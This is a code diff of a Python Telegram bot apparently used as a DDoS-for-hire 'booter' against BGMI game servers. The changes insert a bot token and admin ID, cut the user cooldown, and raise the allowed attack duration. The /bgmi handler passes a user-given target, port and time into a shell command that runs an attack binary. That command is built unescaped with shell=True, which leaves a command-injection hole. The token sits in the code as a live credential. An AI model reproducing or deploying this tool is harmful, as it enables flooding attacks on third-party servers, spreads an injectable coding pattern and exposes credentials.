@@ -8,10 +8,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('YOUR_BOT_TOKEN')
+bot = telebot.TeleBot('7675494292:AAH6MvE49bACykXD5DtWNcadgxGAnYQN5W8')
 
 # Admin user IDs
-admin_id = {"7941184624"}
+admin_id = {"5666606072"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -210,7 +210,7 @@ def start_attack_reply(message, target, port, time):
 # Dictionary to store the last time each user ran the /bgmi command
 bgmi_cooldown = {}
 
-COOLDOWN_TIME =0
+COOLDOWN_TIME =10
 
 # Handler for /bgmi command
 @bot.message_handler(commands=['bgmi'])
@@ -221,7 +221,7 @@ def handle_bgmi(message):
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
             if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 3:
-                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgmi Command Again."
+                response = "You Are On Cooldown . Please Wait 10 seconds Before Running The /bgmi Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
@@ -232,13 +232,13 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 181:
-                response = "Error: Time interval must be less than 80."
+            if time > 241:
+                response = "Error: Time interval must be less than 240."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./venompapa {target} {port} {time} 150"
+                full_command = f"./Moin {target} {port} {time} 900"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
